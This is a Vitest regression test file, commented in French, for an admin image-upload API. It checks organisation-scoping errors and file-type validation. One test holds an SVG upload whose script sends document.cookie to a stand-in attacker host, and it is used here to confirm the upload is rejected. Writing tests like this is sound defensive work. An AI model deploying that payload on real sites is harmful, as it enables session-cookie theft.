/**
 * Non-régression sur `src/app/api/admin/images/**` (revue adversariale du lot
 * 2, audit du 2026-08-19). Cette route écrit dans `studio_images`, la même
 * table que le studio d'images, mais n'avait reçu aucun des correctifs
 * appliqués là-bas :
 *
 * - (INJ-03) le type déclaré par le client faisait foi sans contrôle, et
 *   l'extension de la clé de stockage venait du nom de fichier fourni ; une
 *   image vectorielle porteuse d'un script entrait donc en base sans filtre.
 * - (P0-6 / AZ-02 / AZ-12) l'organisation était résolue par
 *   `getOrgId(getOrgSlugFromHeaders(...))`, sans aucun contrôle
 *   d'appartenance. Le rôle global d'administrateur exigé rend l'escalade
 *   moins nette qu'au studio (un vrai administrateur global peut légitimement
 *   agir sur n'importe quelle organisation), mais un sous-domaine visant une
 *   organisation qui n'existe pas ne doit renvoyer ni lecture ni écriture.
 *
 * Motif de vérification : « répond une erreur ET ne fait rien ». L'absence
 * d'effet de bord est prouvée par les mocks : non-appel de `db.insert`,
 * `db.update`, `db.delete`, `uploadFile` et `deleteFile`.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
import { NextRequest } from "next/server";

const h = vi.hoisted(() => ({
  getSessionUser: vi.fn(),
  getSpacePermission: vi.fn(),
  uploadFile: vi.fn(),
  deleteFile: vi.fn(),
  fileTypeFromBuffer: vi.fn(),
  selectQueue: [] as unknown[][],
  selectCalls: { count: 0 },
  deleteCalls: { count: 0 },
  updateCalls: { count: 0 },
  insertCalls: { count: 0 },
}));

function chain(rows: unknown[]) {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const self: any = {
    from: vi.fn().mockReturnThis(),
    innerJoin: vi.fn().mockReturnThis(),
    where: vi.fn().mockReturnThis(),
    set: vi.fn().mockReturnThis(),
    values: vi.fn().mockReturnThis(),
    orderBy: vi.fn().mockResolvedValue(rows),
    limit: vi.fn().mockResolvedValue(rows),
    returning: vi.fn().mockResolvedValue(rows),
  };
  return self;
}

vi.mock("@/lib/auth/get-user", () => ({ getSessionUser: h.getSessionUser }));
vi.mock("@/lib/auth/check-access", () => ({
  getSpacePermission: h.getSpacePermission,
  isGlobalAdmin: (u: { globalRole?: string }) =>
    u?.globalRole === "admin" || u?.globalRole === "super_admin",
}));
vi.mock("file-type", () => ({ fileTypeFromBuffer: h.fileTypeFromBuffer }));
// `requireOrgScoped` ne recopie plus la règle de résolution d'organisation, il
// délègue à `resolveRequestOrg` (revue adversariale du lot 6, 2026-08-20).
// Celle-ci consulte l'organisation partagée par défaut pour la distinguer d'un
// tenant isolé : seule cette lecture-là est doublée ici, la règle de
// résolution reste exercée pour de vrai.
vi.mock("@/lib/org/get-org-id", () => ({
  getDefaultOrgId: async () => "org-par-defaut",
}));

vi.mock("@/lib/db", () => ({
  db: {
    select: vi.fn(() => {
      const rows = h.selectQueue[h.selectCalls.count] ?? [];
      h.selectCalls.count += 1;
      return chain(rows);
    }),
    delete: vi.fn(() => {
      h.deleteCalls.count += 1;
      return chain([]);
    }),
    update: vi.fn(() => {
      h.updateCalls.count += 1;
      return chain([]);
    }),
    insert: vi.fn(() => {
      h.insertCalls.count += 1;
      return chain([{ id: "img-neuf" }]);
    }),
  },
}));
// L'ingestion (verrou, quota, insertion, S3) est couverte par ingest.test.ts et
// studio-admin-quota.test.ts : ici elle dépose via `uploadFile` pour garder les
// assertions sur l'objet envoyé (clé, type canonique).
vi.mock("@/lib/media/ingest", () => ({
  ingestMedia: async (i: { storageKey: string; buffer: Buffer; file: { type: string } }) => {
    await h.uploadFile(i.storageKey, i.buffer, i.file.type);
    const c = (h as { insertCalls?: { count: number } }).insertCalls;
    if (c) c.count += 1;
    return { ok: true, media: { id: "img-neuf", filename: "x", storageKey: i.storageKey }, quota: {}, hasLocationExif: false };
  },
}));

vi.mock("@/lib/storage/s3", () => ({
  uploadFile: h.uploadFile,
  deleteFile: h.deleteFile,
}));
vi.mock("next/headers", () => ({
  headers: vi.fn().mockResolvedValue({
    // Sous-domaine d'une organisation qui n'existe pas.
    get: (k: string) => (k === "x-org-slug" ? "org-inexistante" : null),
  }),
}));

import { GET as listGet, POST as uploadPost } from "@/app/api/admin/images/route";
import { PATCH as renamePatch, DELETE as imageDelete } from "@/app/api/admin/images/[id]/route";

/** Administrateur global : seul rôle admis par ces routes. */
const ADMIN = { id: "admin-1", email: "admin@acme.tld", globalRole: "admin" };
const SIMPLE_USER = { id: "user-1", email: "user@acme.tld", globalRole: "user" };

/** Aucune organisation ne correspond au sous-domaine visé. */
function queueOrgIntrouvable() {
  h.selectQueue.length = 0;
  h.selectQueue.push([]);
  h.selectCalls.count = 0;
}

/**
 * L'organisation du sous-domaine existe et l'admin global en est membre.
 *
 * Depuis le correctif AZ-06 (2026-08-20), le rôle `admin` ne dispense plus
 * d'appartenance : `requireOrgScoped` interroge `organization_members` même
 * pour un admin global, et seul `super_admin` franchit encore la frontière
 * d'organisation. La file du faux client doit donc rendre la ligne
 * d'appartenance après la ligne d'organisation.
 */
function queueOrgExistante() {
  h.selectQueue.length = 0;
  h.selectQueue.push([{ id: "org-1", slug: "org-inexistante", isActive: true }]);
  h.selectQueue.push([{ organizationId: "org-1" }]);
  h.selectCalls.count = 0;
}

function attendreAucunEffetDeBord() {
  expect(h.deleteCalls.count).toBe(0);
  expect(h.updateCalls.count).toBe(0);
  expect(h.insertCalls.count).toBe(0);
  expect(h.deleteFile).not.toHaveBeenCalled();
  expect(h.uploadFile).not.toHaveBeenCalled();
}

function uploadRequest(contenu: BlobPart, nom: string, type: string) {
  const fd = new FormData();
  fd.append("file", new File([contenu], nom, { type }));
  fd.append("name", nom);
  return new NextRequest("http://org-inexistante.example.com/api/admin/images", {
    method: "POST",
    body: fd,
  });
}

beforeEach(() => {
  vi.clearAllMocks();
  h.deleteCalls.count = 0;
  h.updateCalls.count = 0;
  h.insertCalls.count = 0;
  h.getSessionUser.mockResolvedValue(ADMIN);
  h.getSpacePermission.mockResolvedValue(null);
});

describe("Bibliothèque d'images admin : rôle global requis", () => {
  it("répond 403 et ne liste rien pour un utilisateur non administrateur", async () => {
    h.getSessionUser.mockResolvedValue(SIMPLE_USER);

    const res = await listGet();

    expect(res.status).toBe(403);
    expect(h.selectCalls.count).toBe(0);
    attendreAucunEffetDeBord();
  });
});

describe("Bibliothèque d'images admin : organisation introuvable (P0-6)", () => {
  it("répond une erreur et ne liste aucune image", async () => {
    queueOrgIntrouvable();

    const res = await listGet();

    expect(res.ok).toBe(false);
    expect(h.selectCalls.count).toBe(1);
    attendreAucunEffetDeBord();
  });

  it("répond une erreur et ne téléverse rien", async () => {
    queueOrgIntrouvable();

    const res = await uploadPost(uploadRequest("binaire", "logo.png", "image/png"));

    expect(res.ok).toBe(false);
    expect(h.selectCalls.count).toBe(1);
    attendreAucunEffetDeBord();
  });

  it("répond une erreur et ne renomme rien", async () => {
    queueOrgIntrouvable();

    const res = await renamePatch(
      new NextRequest("http://org-inexistante.example.com/api/admin/images/img-1", {
        method: "PATCH",
        body: JSON.stringify({ name: "détourné" }),
        headers: { "Content-Type": "application/json" },
      }),
      { params: Promise.resolve({ id: "img-1" }) }
    );

    expect(res.ok).toBe(false);
    attendreAucunEffetDeBord();
  });

  it("répond une erreur et ne supprime ni la ligne ni l'objet de stockage", async () => {
    queueOrgIntrouvable();

    const res = await imageDelete(
      new NextRequest("http://org-inexistante.example.com/api/admin/images/img-1", {
        method: "DELETE",
      }),
      { params: Promise.resolve({ id: "img-1" }) }
    );

    expect(res.ok).toBe(false);
    attendreAucunEffetDeBord();
  });
});

describe("Bibliothèque d'images admin : contrôle du type de fichier (INJ-03)", () => {
  it("refuse un SVG porteur d'une balise script, sans rien téléverser ni insérer", async () => {
    queueOrgExistante();
    const svgAvecScript =
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('//attaquant.tld?c='+document.cookie)</script></svg>";

    const res = await uploadPost(uploadRequest(svgAvecScript, "logo.svg", "image/svg+xml"));

    expect(res.status).toBe(400);
    attendreAucunEffetDeBord();
  });

  it("accepte un PNG dont les octets de tête confirment le type déclaré", async () => {
    queueOrgExistante();
    h.fileTypeFromBuffer.mockResolvedValue({ ext: "png", mime: "image/png" });

    const res = await uploadPost(
      uploadRequest(new Uint8Array([0x89, 0x50, 0x4e, 0x47]).buffer, "logo.png", "image/png")
    );

    expect(res.status).toBe(201);
    expect(h.uploadFile).toHaveBeenCalledTimes(1);
    expect(h.insertCalls.count).toBe(1);
  });
});
